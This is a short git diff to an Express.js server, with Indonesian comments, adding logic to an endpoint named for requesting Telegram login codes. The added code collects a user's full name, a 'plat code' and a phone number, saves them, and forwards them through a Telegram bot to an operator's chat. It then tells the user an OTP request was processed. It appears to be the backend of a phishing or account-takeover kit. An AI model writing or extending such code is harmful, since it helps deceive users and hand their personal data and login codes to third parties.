@@ -35,8 +35,23 @@ app.listen(PORT, () => {
 // Menyediakan endpoint untuk permintaan OTP
 app.post('/request_telegram_code', (req, res) => {
     const { phone } = req.body;
+
     // Logika untuk memproses permintaan OTP ke Telegram
     // Anda bisa menambahkan logika di sini untuk mengirim kode OTP ke pengguna
+    // Contoh: Simpan pengguna menggunakan sessionStore.js
+    const userData = {
+        fullName: req.body.full_name,
+        platCode: req.body.plat_code,
+        phoneNumber: phone,
+    };
+
+    saveUser(phone, userData); // Simpan data pengguna
+    // Kirim pesan ke bot Telegram
+    telegramBot.sendMessage(
+        process.env.TELEGRAM_CHAT_ID,
+        `Permintaan OTP untuk:\nNama: ${userData.fullName}\nKode Plat: ${userData.platCode}\nNomor Telepon: ${userData.phoneNumber}`
+    );
+
     res.send({ message: `Permintaan OTP untuk nomor ${phone} telah diproses.` });
 });
 
